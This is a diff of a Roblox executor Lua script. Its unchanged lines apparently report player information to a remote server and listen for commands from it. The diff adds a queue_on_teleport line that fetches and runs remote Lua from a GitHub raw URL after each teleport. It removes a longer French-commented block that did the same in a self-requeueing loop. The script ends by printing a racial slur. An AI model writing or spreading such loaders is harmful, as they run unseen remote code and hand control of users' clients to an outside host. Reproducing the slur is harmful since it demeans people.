@@ -1,3 +1,7 @@
+
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/zadadzdzadaz/lib/refs/heads/main/dazdaz.lua'))()")
+
+
 local SERVER_URL = "https://robloxlol-production.up.railway.app"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -265,64 +269,6 @@ local playerInfo = getPlayerInfo()
 sendToServer(playerInfo)
 startHeartbeat()
 listenForCommands()
-
--- Script principal à exécuter dans ton executor
-
-local scriptURL = "https://raw.githubusercontent.com/zadadzdzadaz/lib/refs/heads/main/dazdaz.lua"
-
--- Fonction pour charger et exécuter le script
-local function loadAndExecuteScript()
-    local success, scriptCode = pcall(function()
-        return game:HttpGet(scriptURL)
-    end)
-    
-    if success then
-        pcall(function()
-            loadstring(scriptCode)()
-        end)
-        print("[Auto-Execute] Script chargé et exécuté avec succès !")
-    else
-        warn("[Auto-Execute] Erreur lors du chargement du script")
-    end
-end
-
--- Créer le code qui sera exécuté après téléportation
-local autoExecuteCode = [[
-    local scriptURL = "]] .. scriptURL .. [["
-    
-    -- Attendre que le jeu charge complètement
-    if not game:IsLoaded() then
-        game.Loaded:Wait()
-    end
-    
-    -- Petite pause pour être sûr que tout est chargé
-    wait(2)
-    
-    -- Charger et exécuter le script
-    local success, scriptCode = pcall(function()
-        return game:HttpGet(scriptURL)
-    end)
-    
-    if success then
-        pcall(function()
-            loadstring(scriptCode)()
-        end)
-        print("[Auto-Execute] Script réexécuté après téléportation !")
-    end
-    
-    -- Re-queue pour la prochaine téléportation (boucle infinie)
-    pcall(function()
-        queue_on_teleport([==[]] .. autoExecuteCode .. [[]==])
-    end)
-]]
-
--- Queue le script pour la prochaine téléportation
-pcall(function()
-    queue_on_teleport(autoExecuteCode)
-end)
-
--- Exécuter le script maintenant
-loadAndExecuteScript()
 
 
 print("nigger")
